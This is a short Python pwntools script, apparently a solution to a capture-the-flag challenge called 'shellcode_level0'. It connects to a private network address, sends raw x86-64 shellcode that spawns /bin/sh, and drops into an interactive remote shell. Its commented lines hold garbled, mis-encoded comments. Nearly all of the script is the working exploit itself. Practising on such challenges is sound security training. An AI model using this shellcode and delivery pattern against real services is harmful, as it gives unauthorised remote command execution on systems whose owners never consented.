from pwn import *

#p = elf('./shellcode_level0')
io = remote("10.37.129.2",63954)
#context.binary = elf('./shellcode_level0')
#print(vars(context))                   # �鿴context��ֵ
#elf = context.binary                   # �൱��elf = ELF('./ciscn_2019_n_5'    )
#print(hex(elf.sym ['main']))

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
io.sendline(shellcode)
io.interactive()

